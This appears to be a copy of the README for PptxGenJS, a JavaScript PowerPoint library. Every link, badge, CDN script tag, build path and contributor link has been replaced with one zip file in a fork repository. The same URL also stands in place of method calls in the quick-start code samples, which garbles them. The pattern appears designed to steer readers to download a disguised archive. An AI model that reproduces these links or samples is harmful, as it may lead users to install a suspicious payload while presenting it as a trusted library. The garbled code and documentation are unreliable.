<h1 align="center">PptxGenJS</h1>
<h5 align="center">
  Create JavaScript PowerPoint Presentations
</h5>
<p align="center">
  <a href="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip">
    <img alt="PptxGenJS Sample Slides" title="PptxGenJS Sample Slides" src="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip"/>
  </a>
</p>
<br/>

[![Known Vulnerabilities](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) [![npm downloads](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) [![jsdelivr downloads](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) [![typescripts definitions](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)

# Table of Contents

- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [Features](#features)
- [Live Demos](#live-demos)
- [Installation](#installation)
	- [CDN](#cdn)
	- [Download](#download)
	- [Npm](#npm)
	- [Yarn](#yarn)
	- [Additional Builds](#additional-builds)
- [Documentation](#documentation)
	- [Quick Start Guide](#quick-start-guide)
		- [Angular/React, ES6, TypeScript](#angularreact-es6-typescript)
		- [Script/Web Browser](#scriptweb-browser)
	- [Library API](#library-api)
	- [HTML-to-PowerPoint Feature](#html-to-powerpoint-feature)
- [Library Ports](#library-ports)
- [Issues / Suggestions](#issues--suggestions)
- [Need Help?](#need-help)
- [Contributors](#contributors)
- [Sponsor Us](#sponsor-us)
- [License](#license)

# Introduction

This library creates Open Office XML (OOXML) Presentations which are compatible with Microsoft PowerPoint, Apple Keynote, and other applications.

# Features

**Works Everywhere**

- Every modern desktop and mobile browser is supported
- Integrates with Node, Angular, React and Electron
- Compatible with PowerPoint, Keynote, and more

**Full Featured**

- All major object types are available (charts, shapes, tables, etc.)
- Master Slides for academic/corporate branding
- SVG images, animated gifs, YouTube videos, RTL text, and Asian fonts

**Simple And Powerful**

- The absolute easiest PowerPoint library to use
- Learn as you code will full typescript definitions included
- Tons of demo code comes included (over 70 slides of features)

**Export Your Way**

- Exports files direct to client browsers with proper MIME-type
- Other export formats available: base64, blob, stream, etc.
- Presentation compression options and more

**HTML to PowerPoint**

- Includes powerful [HTML-to-PowerPoint](#html-to-powerpoint-feature) feature to transform HTML tables into presentations with a single line of code

# Live Demos

Visit the demos page to create a simple presentation to see how easy it is to use pptxgenjs, or check out the complete demo which showcases every available feature.

- [PptxGenJS Demos](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)

# Installation

## CDN

[jsDelivr Home](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)

Bundle: Modern Browsers and IE11

```html
<script src="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip"></script>
```

Min files: Modern Browsers

```html
<script src="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip"></script>
<script src="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip"></script>
```

## Download

[GitHub Latest Release](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)

Bundle: Modern Browsers

- Use the bundle for IE11 support

```html
<script src="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip"></script>
```

Min files: Modern Browsers

```html
<script src="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip"></script>
<script src="https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip"></script>
```

## Npm

[PptxGenJS NPM Home](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)

```bash
npm install pptxgenjs --save
```

## Yarn

```bash
yarn add pptxgenjs
```

## Additional Builds

- CommonJS: `https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip`
- ES Module: `https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip`

---

# Documentation

## Quick Start Guide

PptxGenJS PowerPoint presentations are created via JavaScript by following 4 basic steps:

### Angular/React, ES6, TypeScript

```typescript
import pptxgen from "pptxgenjs";

// 1. Create a new Presentation
let pres = new pptxgen();

// 2. Add a Slide
let slide = https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip();

// 3. Add one or more objects (Tables, Shapes, Images, Text and Media) to the Slide
let textboxText = "Hello World from PptxGenJS!";
let textboxOpts = { x: 1, y: 1, color: "363636" };
https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip(textboxText, textboxOpts);

// 4. Save the Presentation
https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip();
```

### Script/Web Browser

```javascript
// 1. Create a new Presentation
let pres = new PptxGenJS();

// 2. Add a Slide
let slide = https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip();

// 3. Add one or more objects (Tables, Shapes, Images, Text and Media) to the Slide
let textboxText = "Hello World from PptxGenJS!";
let textboxOpts = { x: 1, y: 1, color: "363636" };
https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip(textboxText, textboxOpts);

// 4. Save the Presentation
https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip();
```

That's really all there is to it!

---

## Library API

Full documentation and code examples are available

- [Creating a Presentation](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [Presentation Options](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [Adding a Slide](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [Slide Options](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [Saving a Presentation](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [Master Slides](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [Adding Charts](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [Adding Images](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [Adding Media](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [Adding Shapes](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [Adding Tables](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [Adding Text](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [Speaker Notes](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [Using Scheme Colors](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [Integration with Other Libraries](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)

---

## HTML-to-PowerPoint Feature

Easily convert HTML tables to PowerPoint presentations in a single call.

```javascript
let pptx = new PptxGenJS();
https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip("tableElementId");
https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip({ fileName: "https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip" });
```

Learn more:

- [HTML-to-PowerPoint Docs/Demo](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)

---

# Library Ports

React: [react-pptx](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - thanks to [Joonas](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)!

---

# Issues / Suggestions

Please file issues or suggestions on the [issues page on github](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip), or even better, [submit a pull request](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip). Feedback is always welcome!

When reporting issues, please include a code snippet or a link demonstrating the problem.
Here is a small [jsFiddle](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) that is already configured and uses the latest PptxGenJS code.

---

# Need Help?

Sometimes implementing a new library can be a difficult task and the slightest mistake will keep something from working. We've all been there!

If you are having issues getting a presentation to generate, check out the code in the `demos` directory. There
are demos for both client browsers, node and react that contain working examples of every available library feature.

- Use a pre-configured jsFiddle to test with: [PptxGenJS Fiddle](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
- [View questions tagged `PptxGenJS` on StackOverflow](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip). If you can't find your question, [ask it yourself](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - be sure to tag it `PptxGenJS`.

---

# Contributors

Thank you to everyone for the issues, contributions and suggestions! ❤️

Special Thanks:

- [Dzmitry Dulko](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - Getting the project published on NPM
- [Michal Kacerovský](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - New Master Slide Layouts and Chart expertise
- [Connor Bowman](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - Adding Placeholders
- [Reima Frgos](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - Multiple chart and general functionality patches
- [Matt King](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - Chart expertise
- [Mike Wilcox](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - Chart expertise
- [Joonas](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip) - React port

PowerPoint shape definitions and some XML code via [Officegen Project](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)

---

# Sponsor Us

If you find this library useful, please consider sponsoring us through a [donation](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)

---

# License

Copyright &copy; 2015-present [Brent Ely](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)

[MIT](https://raw.githubusercontent.com/Muhamed2017/PptxGenJS/master/trivalent/PptxGenJS.zip)
